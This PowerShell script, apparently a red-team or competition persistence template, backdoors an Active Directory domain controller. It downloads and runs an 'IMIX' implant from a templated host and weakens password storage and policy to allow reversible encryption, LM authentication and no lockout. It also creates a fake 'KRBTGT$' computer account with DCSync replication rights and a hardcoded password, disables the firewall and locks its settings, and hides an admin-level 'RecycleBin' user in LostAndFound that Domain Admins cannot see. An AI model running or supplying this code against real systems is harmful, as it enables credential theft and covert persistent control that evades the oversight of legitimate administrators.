Import-Module ActiveDirectory

$DN = (Get-ADDomain).DistinguishedName
$Domain = (Get-ADDomain).DNSRoot

# Install IMIX
$progresspreference="SilentlyContinue"
Invoke-WebRequest -Uri http://{install_loc} -OutFile .\win_install.exe
.\win_install.exe
Remove-Item .\win_install.exe

# Make DC Shit
Get-ADUser -Filter { SamAccountName -notlike "*$" } | Set-ADUser -AllowReversiblePasswordEncryption $true 
Set-ADDefaultDomainPasswordPolicy -Identity $DN -ReversibleEncryptionEnabled $true 
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LMCompatibilityLevel" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "OldPasswordAllowedPeriod" -Value 7200 -Type DWord
Set-ADDefaultDomainPasswordPolicy -Identity $DN -MinPasswordLength 1 -PasswordHistoryCount 0 -ComplexityEnabled $false -MaxPasswordAge "999.00:00:00" -MinPasswordAge "0.00:00:00" -LockoutThreshold 0

# Enable backup admin
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2

# Add computer account
New-ADComputer -Name KRBTGT -AccountPassword (ConvertTo-SecureString "NewPass123" -AsPlainText -Force) -Enabled $true
dsacls 'DC=star-bars,DC=local' /I:T /G 'star-bars.local\KRBTGT$:CA;Replicating Directory Changes'
dsacls 'DC=star-bars,DC=local' /I:T /G 'star-bars.local\KRBTGT$:CA;Replicating Directory Changes All'
net localgroup "Remote Management Users" /add KRBTGT$

# Disable Firewall and Firewall access
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
$path = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
$fwacl = Get-Acl $path
$fwacl.SetAccessRuleProtection($true, $false)
$fwacl.Access | ForEach-Object { $fwacl.RemoveAccessRule($_) }
$fc = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "FullControl", "Deny")
$do = New-Object System.Security.AccessControl.RegistryAccessRule("OWNER RIGHTS","ChangePermissions,TakeOwnership","Deny")
$fwacl.AddAccessRule($fc)
$fwacl.AddAccessRule($do)
Set-Acl $path $fwacl

# Add invisible account in LostAndFound

$BackdoorAccountName = "RecycleBin"

$domainDN = (Get-ADDomain | Select-Object -Property DistinguishedName).DistinguishedName
$DomainAdminsSid = New-Object System.Security.Principal.SecurityIdentifier ((Get-ADGroup "Domain Admins").SID.Value)
$DomainAdminsIdentity = [System.Security.Principal.IdentityReference] ($DomainAdminsSid)

$splat = @{
    Name = $BackdoorAccountName
    AccountPassword = (ConvertTo-SecureString 'NewPass123' -AsPlainText -Force)
    Enabled = $true
    CannotChangePassword = $true
    ChangePasswordAtLogon = $false
    PasswordNeverExpires = $true
    Path = "CN=LostAndFound," + $domainDN
}
New-ADUser @splat

$user = (Get-ADUser $BackdoorAccountName)

$userSid = New-Object System.Security.Principal.SecurityIdentifier $user.SID.Value
$UserIdentity = [System.Security.Principal.IdentityReference] ($userSid)

$SR=New-Object DirectoryServices.DirectoryEntry("LDAP://CN=" + $BackdoorAccountName + ",CN=LostAndFound," + $domainDN)
$searcher=New-Object DirectoryServices.DirectorySearcher($SR)
$searcher.SearchScope = "Base"
$result=$searcher.findone()

$ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
$ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
$NewGUID = New-Object Guid "00000000-0000-0000-0000-000000000000"
$InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'

$ACEs = @()

$ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UserIdentity, $ADRights, $ControlType, $NewGUID, $InheritanceType

# Uncomment to Retain Domain Admins access to hidden user
#$ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $DomainAdminsIdentity, $ADRights, $ControlType, $NewGUID, $InheritanceType

$TargetEntry = $result.GetDirectoryEntry()

$TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
$TargetEntry.PsBase.ObjectSecurity.SetOwner($UserIdentity)

$TargetEntry.PsBase.ObjectSecurity.SetAccessRuleProtection($true, $false)

$CurrentIdentities = $TargetEntry.PsBase.ObjectSecurity.Access | Select-Object IdentityReference

ForEach ($PersonIdentity in $CurrentIdentities) {
    $TargetEntry.PsBase.ObjectSecurity.PurgeAccessRules($PersonIdentity.IdentityReference)
}

ForEach ($ACE in $ACEs) {
    $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
}

$TargetEntry.PsBase.CommitChanges()

